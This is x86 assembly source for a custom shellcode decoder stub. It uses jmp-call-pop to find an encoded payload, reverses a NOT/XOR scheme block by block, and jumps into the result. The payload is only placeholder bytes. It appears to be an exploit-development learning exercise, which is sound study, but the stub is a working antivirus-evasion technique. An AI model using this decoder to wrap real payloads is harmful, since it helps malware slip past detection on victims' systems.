global _start

section .text
_start:
    jmp short to_decode

decode:
    pop esi                   ; addr of shellcode
    push esi            
    pop edi                   ; copy of shellcode addr
    xor eax, eax
    xor ebx, ebx
    xor edx, edx

decode_loop:
    cmp byte [esi], 0xaa      ; compare with end marker
    je shellcode              ; jump to decoded shellcode

    mov al, byte [esi]		  ; make a copy of random byte

    xor byte [esi+1], 0xff    ; 1st byte: NOT
    mov bl, byte[esi+1]		  ; 
    mov byte [edi], bl   	  ; move the 1st byte back in place

    xor byte [esi+2], al      ; 2nd byte: XORed with random byte (0th)
    mov bl, byte [esi+2]
    mov byte [edi+1], bl	  ; move the 2nd byte back in place

    xor byte [esi+3], 0xff    ; 3rd byte: NOT
    mov bl, byte[esi+3]		  ; 
    mov byte [edi+2], bl	  ; move the 3rd byte back in place

                              ; 4th byte: XORed with 2nd byte XORed and with random byte
    mov dl, byte [edi+1]	  ; get the value of the decoded 2nd byte
    xor byte [esi+4], al 	  ; XOR with random byte
    xor byte [esi+4], dl      ; XOR with second decoded byte
    mov bl, byte [esi+4]
    mov byte [edi+3], bl      ; move the 4th byte back in place

    add esi, 0x05             ; move esi to the next block of shellcode
    add edi, 0x04		      ; move edi pointer for the decoded shellcode
    jmp short decode_loop     ; jmp back and keep decoding

to_decode:
    call decode 
    shellcode: db 0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09
